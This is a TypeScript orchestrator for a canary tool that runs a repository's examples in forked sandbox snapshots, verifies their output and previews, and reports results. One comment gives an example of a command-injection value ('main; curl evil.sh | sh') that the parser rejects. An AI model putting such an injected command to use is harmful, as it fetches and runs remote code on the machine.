/**
 * The orchestrator.
 *
 * Shape of a run:
 *
 *   1. One prep sandbox: clone the repo, discover the examples, install every
 *      example's dependencies, snapshot.
 *   2. Fork that snapshot once per example and run exactly one example on each.
 *   3. Verify, classify, report, tear down.
 *
 * Step 1 is the whole point. Installing dependencies is the slow, expensive,
 * network-bound part of running an example, and it is identical for every run
 * of the same commit. Doing it once and forking a memory snapshot turns
 * N×install into 1×install plus N sub-second resumes, and it makes every
 * example start from a byte-identical machine — so a failure is the example's
 * fault, not install-order's.
 *
 * Examples that need a display can't fork a headless sandbox snapshot, so they
 * get a desktop VM and pay for their own install. That is stated in the report
 * rather than hidden.
 */

import type { CanaryConfig } from "./config.ts";
import { collectDirEntries, discoverExamples, type Example, type Runtime } from "./discover.ts";
import type { BrowserProbe, Clock, Machine, MachineKind, MachinePool } from "./solari/types.ts";
import { systemClock } from "./solari/types.ts";
import { parseCommand } from "./util/command.ts";
import { Outcome, classify, classifyThrown, isBlocking, truncate, type Verdict } from "./util/classify.ts";
import { pool as runPool, withDeadline } from "./util/concurrency.ts";
import { createRedactor, type Redactor } from "./util/redact.ts";
import { checkStdout } from "./verify/expect.ts";
import { waitForPreview } from "./verify/http.ts";
import { verifyRenders } from "./verify/visual.ts";

const REPO_DIR = "repo";
const OUTPUT_TAIL = 4_000;
const CLONE_TIMEOUT_MS = 120_000;
const INSTALL_TIMEOUT_MS = 600_000;

export interface StepRecord {
  exitCode: number;
  durationMs: number;
  stdoutTail: string;
  stderrTail: string;
}

export interface ExampleResult {
  name: string;
  dir: string;
  runtime: Runtime;
  machineKind: MachineKind | "none";
  machineId: string | undefined;
  outcome: Outcome;
  reason: string;
  durationMs: number;
  attempts: number;
  install: StepRecord | undefined;
  run: StepRecord | undefined;
  preview: { url: string; status: number; attempts: number } | undefined;
  visual: { title: string; missing: string[]; screenshotBase64: string | undefined; sessionId: string | undefined; replayUrl: string | undefined } | undefined;
  streamUrl: string | undefined;
  solariPackages: string[];
}

export interface PrepRecord {
  machineId: string;
  snapshotId: string | undefined;
  cloneMs: number;
  installMs: number;
  examplesFound: number;
  headSha: string | undefined;
}

export interface RunSummary {
  repo: string;
  ref: string;
  startedAt: string;
  finishedAt: string;
  durationMs: number;
  prep: PrepRecord;
  results: ExampleResult[];
  totals: Record<Outcome, number>;
  machineMinutes: number;
  /** 0 when nothing blocking failed. Suitable as a process exit code. */
  exitCode: number;
}

export interface RunnerDeps {
  machines: MachinePool;
  /** Lazily constructed so runs with no preview checks never open a browser. */
  browser?: () => Promise<BrowserProbe>;
  /** When set, only these example names run; the rest are reported as skipped. */
  only?: readonly string[];
  env?: Record<string, string | undefined>;
  clock?: Clock;
  /** Injectable so preview polling can be exercised without a network. */
  fetchImpl?: typeof fetch;
  log?: (line: string) => void;
  redactor?: Redactor;
}

function tail(text: string, redactor: Redactor): string {
  const redacted = redactor(text ?? "");
  return redacted.length <= OUTPUT_TAIL ? redacted : `…${redacted.slice(-OUTPUT_TAIL)}`;
}

function emptyTotals(): Record<Outcome, number> {
  return { pass: 0, fail: 0, skipped: 0, flake: 0, timeout: 0 };
}

/** Only the declared names, and only the ones actually present in the env. */
function collectSecrets(
  names: readonly string[],
  env: Record<string, string | undefined>,
): { values: Record<string, string>; missing: string[] } {
  const values: Record<string, string> = {};
  const missing: string[] = [];
  for (const name of names) {
    const value = env[name];
    if (value === undefined || value === "") missing.push(name);
    else values[name] = value;
  }
  return { values, missing };
}

interface ExecContext {
  cwd?: string;
  env?: Record<string, string>;
  timeoutMs: number;
  label: string;
  clock: Clock;
  redactor: Redactor;
}

/**
 * Runs one command and keeps both a report-safe record and the raw output.
 * Classification reads the raw text — a missing-credential message often
 * arrives before the tail window — while only the redacted record is ever
 * written anywhere.
 */
async function execStep(
  machine: Machine,
  command: string,
  ctx: ExecContext,
): Promise<{ record: StepRecord; raw: { exitCode: number; stdout: string; stderr: string } }> {
  const parsed = parseCommand(command);
  const started = ctx.clock.now();
  const raw = await withDeadline(
    machine.exec(parsed.cmd, {
      args: parsed.args,
      ...(ctx.cwd ? { cwd: ctx.cwd } : {}),
      ...(ctx.env ? { env: ctx.env } : {}),
    }),
    ctx.timeoutMs,
    ctx.label,
  );
  return {
    raw,
    record: {
      exitCode: raw.exitCode,
      durationMs: ctx.clock.now() - started,
      stdoutTail: tail(raw.stdout, ctx.redactor),
      stderrTail: tail(raw.stderr, ctx.redactor),
    },
  };
}

interface InstallOutcome {
  record: StepRecord;
  /** Set only when the install failed, so the example never gets a fork. */
  verdict: Verdict | undefined;
}

interface Prepared {
  machine: Machine;
  examples: Example[];
  installs: Map<string, InstallOutcome>;
  prep: PrepRecord;
}

async function prepare(
  config: CanaryConfig,
  deps: RunnerDeps,
  clock: Clock,
  redactor: Redactor,
  log: (line: string) => void,
): Promise<Prepared> {
  const machine = await deps.machines.createSandbox({
    template: config.template,
    ...(config.cpu ? { cpu: config.cpu } : {}),
    ...(config.memMb ? { memMb: config.memMb } : {}),
    timeoutMs: INSTALL_TIMEOUT_MS,
    onTimeout: "kill",
  });
  log(`prep machine ${machine.id} up`);

  try {
    return await prepareIn(machine, config, deps, clock, redactor, log);
  } catch (error) {
    // Nothing above will ever see this machine again, so it has to go now —
    // otherwise it bills until its idle window runs out.
    await machine.kill().catch(() => {});
    throw error;
  }
}

async function prepareIn(
  machine: Machine,
  config: CanaryConfig,
  deps: RunnerDeps,
  clock: Clock,
  redactor: Redactor,
  log: (line: string) => void,
): Promise<Prepared> {
  // `parseCommand` rejects shell metacharacters, so a ref like
  // `main; curl evil.sh | sh` fails loudly here instead of executing.
  const clone = await execStep(
    machine,
    `git clone --depth 1 --branch ${config.ref} ${config.repo} ${REPO_DIR}`,
    { timeoutMs: CLONE_TIMEOUT_MS, label: "git clone timed out", clock, redactor },
  );
  if (clone.record.exitCode !== 0) {
    throw new Error(`clone failed: ${clone.record.stderrTail || `exit ${clone.record.exitCode}`}`);
  }

  const sha = await machine.exec("git", { args: ["-C", REPO_DIR, "rev-parse", "HEAD"] });
  const headSha = sha.exitCode === 0 ? sha.stdout.trim().slice(0, 12) : undefined;

  const entries = await collectDirEntries(machine, REPO_DIR, config.examplesDir);
  const examples = discoverExamples(entries, config);
  log(`found ${examples.length} example(s) at ${headSha ?? config.ref}`);

  // Sequential on purpose: parallel package-manager runs in one machine fight
  // over the same cache and turn a clean install failure into a confusing one.
  const installStarted = clock.now();
  const installs = new Map<string, InstallOutcome>();
  for (const example of examples) {
    if (example.skip || !example.install || example.needsDisplay) continue;
    if (deps.only && !deps.only.includes(example.name)) continue;
    const step = await execStep(machine, example.install, {
      cwd: `${REPO_DIR}/${example.dir}`,
      timeoutMs: INSTALL_TIMEOUT_MS,
      label: `install ${example.name} timed out`,
      clock,
      redactor,
    });
    installs.set(example.name, {
      record: step.record,
      verdict: step.raw.exitCode === 0 ? undefined : classify(step.raw),
    });
    log(
      `${step.raw.exitCode === 0 ? "installed" : "install failed:"} ${example.name} ` +
        `(${Math.round(step.record.durationMs / 100) / 10}s)`,
    );
  }
  const installMs = clock.now() - installStarted;

  const snapshotId = machine.snapshot
    ? await machine.snapshot(`canary-${headSha ?? config.ref}`)
    : undefined;
  if (snapshotId) log(`snapshot ${snapshotId} — forks start from here`);

  return {
    machine,
    examples,
    installs,
    prep: {
      machineId: machine.id,
      snapshotId,
      cloneMs: clone.record.durationMs,
      installMs,
      examplesFound: examples.length,
      headSha,
    },
  };
}

interface AttemptContext {
  config: CanaryConfig;
  machines: MachinePool;
  clock: Clock;
  redactor: Redactor;
  log: (line: string) => void;
  snapshotId: string | undefined;
  /**
   * Used when the pool can't snapshot: examples then run one at a time in the
   * prep machine, which already has the repo and the installs.
   */
  fallbackMachine: Machine | undefined;
  env: Record<string, string | undefined>;
  fetchImpl: typeof fetch | undefined;
  getBrowser: () => Promise<BrowserProbe>;
}

function blankResult(example: Example): ExampleResult {
  return {
    name: example.name,
    dir: example.dir,
    runtime: example.runtime,
    machineKind: "none",
    machineId: undefined,
    outcome: Outcome.Skipped,
    reason: "not run",
    durationMs: 0,
    attempts: 0,
    install: undefined,
    run: undefined,
    preview: undefined,
    visual: undefined,
    streamUrl: undefined,
    solariPackages: example.solariPackages,
  };
}

/** Fresh machine for one example: a snapshot fork when we can, a desktop when the example needs pixels. */
async function acquire(example: Example, ctx: AttemptContext): Promise<{ machine: Machine; owned: boolean }> {
  const spec = {
    template: ctx.config.template,
    ...(ctx.config.cpu ? { cpu: ctx.config.cpu } : {}),
    ...(ctx.config.memMb ? { memMb: ctx.config.memMb } : {}),
    // Generous idle window: the example's own deadline is what bounds the run.
    timeoutMs: example.timeoutMs + 60_000,
    onTimeout: "kill" as const,
  };
  if (example.needsDisplay) {
    return { machine: await ctx.machines.createDesktop({ ...spec, resolution: [1280, 800] }), owned: true };
  }
  if (ctx.snapshotId) {
    return { machine: await ctx.machines.createFromSnapshot(ctx.snapshotId, spec), owned: true };
  }
  if (ctx.fallbackMachine) return { machine: ctx.fallbackMachine, owned: false };
  return { machine: await ctx.machines.createSandbox(spec), owned: true };
}

/** Preview URLs carry a signed token in the query string; a path has to go in front of it. */
function joinPreviewPath(url: string, path: string): string {
  const parsed = new URL(url);
  parsed.pathname = path.startsWith("/") ? path : `/${path}`;
  return parsed.toString();
}

interface ServingOutcome {
  record: StepRecord;
  raw: { exitCode: number; stdout: string; stderr: string };
  preview: ExampleResult["preview"];
  visual: ExampleResult["visual"];
  verifyError: string | undefined;
}

/**
 * For examples that serve instead of exiting: start it, wait for the port to
 * answer, load it in a real browser, then stop it. A server still running when
 * we stopped it is a pass — not exit code 143.
 */
async function verifyServing(
  machine: Machine,
  example: Example,
  cwd: string,
  env: Record<string, string>,
  ctx: AttemptContext,
): Promise<ServingOutcome> {
  if (!machine.startBackground || !machine.previewUrl) {
    throw new Error("preview verification needs a sandbox machine with preview URLs");
  }
  const port = example.verify.port as number;
  const parsed = parseCommand(example.start as string);
  const startedAt = ctx.clock.now();
  const proc = await machine.startBackground(parsed.cmd, { args: parsed.args, cwd, env });

  let verifyError: string | undefined;
  let preview: ExampleResult["preview"];
  let visual: ExampleResult["visual"];

  try {
    const { url, token } = await machine.previewUrl(port);
    const target = example.verify.path ? joinPreviewPath(url, example.verify.path) : url;
    const probe = await waitForPreview(target, {
      token,
      clock: ctx.clock,
      ...(ctx.fetchImpl ? { fetchImpl: ctx.fetchImpl } : {}),
    });
    preview = { url: ctx.redactor(target), status: probe.status, attempts: probe.attempts };

    if (probe.status >= 400) {
      verifyError = `preview returned ${probe.status}`;
    } else if (example.verify.expectText && example.verify.expectText.length > 0) {
      const evidence = await verifyRenders(await ctx.getBrowser(), target, example.verify.expectText, {
        "x-pinetree-preview-token": token,
      });
      visual = {
        title: evidence.title,
        missing: evidence.missing,
        // Screenshots are kept only for failures. A green run does not need
        // thirty base64 PNGs wedged into its artifact.
        screenshotBase64: evidence.ok || !evidence.png ? undefined : Buffer.from(evidence.png).toString("base64"),
        sessionId: evidence.sessionId,
        replayUrl: evidence.replayUrl,
      };
      verifyError = evidence.reason;
    }
  } catch (error) {
    const name = error instanceof Error ? error.name : "";
    if (name !== "PreviewNeverCameUp" && name !== "PreviewUnauthorized") throw error;
    verifyError = error instanceof Error ? truncate(error.message, 140) : "preview check failed";
  }

  const stillRunning = proc.running();
  if (stillRunning) await proc.kill().catch(() => {});
  const output = proc.output();
  const exitCode = stillRunning ? 0 : await proc.wait();

  return {
    raw: { exitCode, stdout: output.stdout, stderr: output.stderr },
    record: {
      exitCode,
      durationMs: ctx.clock.now() - startedAt,
      stdoutTail: tail(output.stdout, ctx.redactor),
      stderrTail: tail(output.stderr, ctx.redactor),
    },
    preview,
    visual,
    verifyError,
  };
}

async function attempt(example: Example, ctx: AttemptContext): Promise<ExampleResult> {
  const result = blankResult(example);
  const startedAt = ctx.clock.now();
  result.attempts = 1;

  // Boot nothing if the credentials aren't there. A machine that exists only to
  // print "SOLARI_API_KEY is not set" is a machine you paid for to learn nothing.
  const { values: secrets, missing } = collectSecrets(example.secrets, ctx.env);
  if (missing.length > 0) {
    result.reason = `missing ${missing.join(", ")} in this environment`;
    result.durationMs = ctx.clock.now() - startedAt;
    return result;
  }

  let machine: Machine | undefined;
  let owned = false;
  try {
    const acquired = await acquire(example, ctx);
    machine = acquired.machine;
    owned = acquired.owned;
    result.machineId = machine.id;
    result.machineKind = machine.kind;
    result.streamUrl = machine.streamUrl;
    const cwd = `${REPO_DIR}/${example.dir}`;
    const shared = { clock: ctx.clock, redactor: ctx.redactor };

    // Desktops can't fork the prep sandbox's snapshot, so they bootstrap themselves.
    if (example.needsDisplay) {
      const clone = await execStep(
        machine,
        `git clone --depth 1 --branch ${ctx.config.ref} ${ctx.config.repo} ${REPO_DIR}`,
        { timeoutMs: CLONE_TIMEOUT_MS, label: `clone for ${example.name} timed out`, ...shared },
      );
      if (clone.raw.exitCode !== 0) {
        result.outcome = Outcome.Fail;
        result.reason = "clone failed inside the desktop VM";
        result.run = clone.record;
        return result;
      }
      if (example.install) {
        const installed = await execStep(machine, example.install, {
          cwd,
          timeoutMs: INSTALL_TIMEOUT_MS,
          label: `install ${example.name} timed out`,
          ...shared,
        });
        result.install = installed.record;
        if (installed.raw.exitCode !== 0) {
          const verdict = classify(installed.raw);
          result.outcome = verdict.outcome;
          result.reason = `install: ${verdict.reason}`;
          return result;
        }
      }
    }

    let verdict: Verdict;
    if (example.verify.kind === "preview") {
      const serving = await withDeadline(
        verifyServing(machine, example, cwd, secrets, ctx),
        example.timeoutMs,
        `${example.name} timed out`,
      );
      result.run = serving.record;
      result.preview = serving.preview;
      result.visual = serving.visual;
      verdict = classify(serving.raw, serving.verifyError);
    } else {
      const step = await execStep(machine, example.start as string, {
        cwd,
        env: secrets,
        timeoutMs: example.timeoutMs,
        label: `${example.name} timed out`,
        ...shared,
      });
      result.run = step.record;
      const verifyError =
        step.raw.exitCode === 0 && example.verify.kind === "stdout" && example.verify.expectStdout
          ? checkStdout(step.raw.stdout, example.verify.expectStdout)
          : undefined;
      verdict = classify(step.raw, verifyError);

      // A desktop example's whole output is what ended up on screen, so keep
      // the frame either way — it is the only readable evidence it worked.
      if (example.needsDisplay && machine.screenshot) {
        const png = await machine.screenshot().catch(() => undefined);
        if (png) {
          result.visual = {
            title: example.name,
            missing: [],
            screenshotBase64: Buffer.from(png).toString("base64"),
            sessionId: undefined,
            replayUrl: undefined,
          };
        }
      }
    }

    result.outcome = verdict.outcome;
    result.reason = verdict.reason;
  } catch (error) {
    const verdict = classifyThrown(error);
    result.outcome = verdict.outcome;
    result.reason = verdict.reason;
  } finally {
    result.durationMs = ctx.clock.now() - startedAt;
    // kill, not close: close only drops the local control channel and leaves
    // the VM billing until its idle window runs out.
    if (machine && owned) await machine.kill().catch(() => {});
  }
  return result;
}

const NO_BROWSER = async (): Promise<BrowserProbe> => {
  throw new Error(
    "an example asked for preview verification, but no browser factory was supplied to the runner",
  );
};

export async function runCanary(config: CanaryConfig, deps: RunnerDeps): Promise<RunSummary> {
  const clock = deps.clock ?? systemClock;
  const env = deps.env ?? process.env;
  const log = deps.log ?? (() => {});
  const redactor = deps.redactor ?? createRedactor(config.secrets.map((name) => env[name]));
  const runStart = clock.now();

  let browser: BrowserProbe | undefined;
  const getBrowser = async (): Promise<BrowserProbe> => {
    browser ??= await (deps.browser ?? NO_BROWSER)();
    return browser;
  };

  const prepared = await prepare(config, deps, clock, redactor, log);
  const ctx: AttemptContext = {
    config,
    machines: deps.machines,
    clock,
    redactor,
    log,
    snapshotId: prepared.prep.snapshotId,
    fallbackMachine: prepared.prep.snapshotId ? undefined : prepared.machine,
    env,
    fetchImpl: deps.fetchImpl,
    getBrowser,
  };

  // Anything already settled during prep never gets a machine of its own.
  const decided: ExampleResult[] = [];
  const runnable: Example[] = [];
  for (const example of prepared.examples) {
    if (deps.only && !deps.only.includes(example.name)) {
      decided.push({ ...blankResult(example), reason: "not selected" });
      continue;
    }
    if (example.skip) {
      decided.push({ ...blankResult(example), reason: example.skipReason ?? "skipped by config" });
      continue;
    }
    const install = prepared.installs.get(example.name);
    if (install?.verdict) {
      decided.push({
        ...blankResult(example),
        machineId: prepared.prep.machineId,
        machineKind: "sandbox",
        outcome: install.verdict.outcome,
        reason: `install: ${install.verdict.reason}`,
        install: install.record,
        durationMs: install.record.durationMs,
        attempts: 1,
      });
      continue;
    }
    runnable.push(example);
  }

  // The snapshot outlives the machine that made it, so give the prep VM's quota
  // slot back before fanning out.
  if (prepared.prep.snapshotId) await prepared.machine.kill().catch(() => {});

  const budgetMs = config.maxMachineMinutes * 60_000;
  let spentMs = prepared.prep.cloneMs + prepared.prep.installMs;
  const concurrency = prepared.prep.snapshotId ? config.concurrency : 1;
  if (concurrency === 1 && runnable.length > 1) {
    log("pool cannot snapshot — falling back to sequential runs in the prep machine");
  }

  const settled = await runPool(
    runnable,
    async (example) => {
      if (spentMs >= budgetMs) {
        return {
          ...blankResult(example),
          reason: `machine-minute budget (${config.maxMachineMinutes}m) exhausted`,
        };
      }
      let last = await attempt(example, ctx);
      for (
        let retry = 1;
        retry <= config.retries && (last.outcome === Outcome.Flake || last.outcome === Outcome.Timeout);
        retry++
      ) {
        log(`retry ${retry}/${config.retries} for ${example.name} after: ${last.reason}`);
        spentMs += last.durationMs;
        const again = await attempt(example, ctx);
        again.attempts = retry + 1;
        last = again;
      }
      spentMs += last.durationMs;
      log(`${last.outcome} ${example.name} — ${last.reason}`);
      return last;
    },
    { limit: concurrency },
  );

  const results = [...decided];
  settled.forEach((entry, index) => {
    const example = runnable[index] as Example;
    if (entry.ok) {
      results.push(entry.value);
      return;
    }
    const verdict = classifyThrown(entry.error);
    results.push({ ...blankResult(example), outcome: verdict.outcome, reason: verdict.reason, attempts: 1 });
  });
  results.sort((a, b) => a.name.localeCompare(b.name));

  if (!prepared.prep.snapshotId) await prepared.machine.kill().catch(() => {});
  if (browser) {
    await browser.close().catch(() => {});
    // Replays only exist once the session is released, so backfill them now
    // rather than pretending a link was available during the run.
    if (browser.replayUrlFor) {
      for (const result of results) {
        if (!result.visual?.sessionId || result.visual.replayUrl) continue;
        result.visual.replayUrl = await browser.replayUrlFor(result.visual.sessionId).catch(() => undefined);
      }
    }
  }

  const totals = emptyTotals();
  for (const result of results) totals[result.outcome] += 1;

  return {
    repo: config.repo,
    ref: config.ref,
    startedAt: new Date(runStart).toISOString(),
    finishedAt: new Date(clock.now()).toISOString(),
    durationMs: clock.now() - runStart,
    prep: prepared.prep,
    results,
    totals,
    machineMinutes: Math.round((spentMs / 60_000) * 100) / 100,
    exitCode: results.some((result) => isBlocking(result.outcome)) ? 1 : 0,
  };
}
